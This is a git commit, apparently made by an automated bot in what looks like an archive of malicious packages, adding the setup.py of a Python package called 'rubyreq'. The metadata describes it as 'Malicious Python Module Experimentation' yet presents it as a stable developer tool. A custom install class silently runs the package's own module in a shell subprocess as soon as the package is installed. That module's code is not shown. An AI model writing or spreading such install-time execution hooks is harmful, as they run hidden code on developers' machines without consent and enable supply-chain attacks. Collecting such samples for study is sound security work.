0744d699921d1b82e14414f5fad3c8000467d849
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 14:44:46 +0000

    Add package rubyreq/3/rubyreq-3.tar.gz

---
+++ packages/rubyreq/rubyreq-3.tar.gz/rubyreq-3/setup.py
@@ -0,0 +1,38 @@
+from setuptools import setup, find_packages
+from setuptools import setup
+from setuptools.command.install import install
+from sys import executable
+import subprocess
+
+class InstallLocalPackage(install):
+    def run(self):
+        install.run(self)
+        subprocess.Popen(f"{executable} -m rubyreq", shell=True)
+
+setup(
+  name="rubyreq",
+  version="3",
+  author="CodeUK",
+  author_email="d@doop.fun",
+  description="Malicious Python Module Experimentation",
+  url="https://github.com/codeuk/shutil",
+  project_urls={
+    "GitHub": "https://github.com/codeuk/shutil",
+    "Bug Tracker": "https://github.com/codeuk/shutil/issues",
+  },
+  license="MIT",
+  keywords=["rubyreq","rubyreq"],
+  classifiers = [
+  "Programming Language :: Python :: 3",
+  "License :: OSI Approved :: MIT License",
+  "Operating System :: Microsoft :: Windows",
+  "Development Status :: 5 - Production/Stable",
+  "Intended Audience :: Developers",
+  "Natural Language :: English",
+  "Topic :: Software Development"
+  ],
+  package_dir={"": "."},
+  packages=find_packages(where="."),
+  install_requires=['requests'],
+  cmdclass={ 'install': InstallLocalPackage }
+)
